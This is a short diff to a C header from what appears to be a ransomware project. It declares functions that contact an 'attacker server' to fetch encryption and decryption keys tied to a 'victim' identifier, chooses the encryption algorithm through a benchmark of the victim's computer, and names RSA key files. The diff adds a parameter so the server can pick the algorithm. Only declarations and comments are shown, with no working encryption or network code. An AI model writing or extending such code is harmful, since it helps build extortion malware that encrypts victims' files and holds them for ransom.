@@ -8,6 +8,7 @@
 #define GET_DEC_KEY_ENDPOINT "decrypt"
 #define MSG_SIZE 1024
 #define RESPONSE_SIZE 4096
+#define ALGO_SIZE 32
 #define ENC_RSA_KEY_NAME "public.pem"
 #define DEC_RSA_KEY_NAME "private.pem"
 
@@ -17,14 +18,16 @@
  * @brief Connect to the server and get the encryption key, the algorithm for encryption is chose thanks to a benchmark.
  * @param p_identifier The unique identifier of the victim in aim to store encryption and decryption keys associate to it.
  * @param p_data The benchmark data of the current computer.
+ * @param p_algo The algorithm chosen by attacker server.
 */
-char* get_encryption_key(char* p_identifier, benchmarkData* p_data);
+char* get_encryption_key(char* p_identifier, benchmarkData* p_data, char** p_algo);
 
 /**
  * @brief Connect to the server and get the decryption key.
  * @param p_identifier The unique identifier of the victim in aim to retrieve the decryption keys associate to it.
+ * @param p_algo The algorithm chosen by attacker server.
 */
-char* get_decryption_key(char* p_identifier);
+char* get_decryption_key(char* p_identifier, char** p_algo);
 
 /**
  * @brief Save a key in a file.
